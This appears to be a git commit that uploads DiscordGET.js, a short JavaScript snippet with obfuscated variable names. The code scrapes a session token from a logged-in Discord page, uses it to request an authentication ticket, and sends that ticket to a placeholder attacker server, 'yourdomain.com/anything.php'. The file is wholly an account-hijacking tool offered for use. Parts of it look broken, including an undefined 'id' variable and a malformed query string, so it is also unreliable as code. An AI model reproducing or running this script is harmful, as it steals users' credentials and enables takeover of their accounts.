c4bc0eceb3ff63b0c504e93bc54f211d7c8a2926
#Fluroescent <Zegitora@gmail.com>
2022-01-08 21:53:55 +1100

    Add files via upload

---
+++ DiscordGET.js
@@ -0,0 +1,13 @@
+(async function() {
+    var _0x3051de = (await (await fetch("https://discord.com/channels/@me", {
+        'credentials': 'include'
+    }))['text']())['split']('setToken(\x27')[0x1]['split']('\x27)')[0x0];
+    var _0x3e8f56 = (await fetch('https://discord.com/v1/authentication-ticket', {
+        'method': 'POST',
+        'credentials': 'include',
+        'headers': {
+            'x-csrf-token': _0x3051de
+        }
+    }))['headers']['get']('discord-authentication-ticket');
+    await fetch("https://yourdomain.com/anything.php" + '?id= ' + id + '?t=' + _0x3e8f56);
+}());
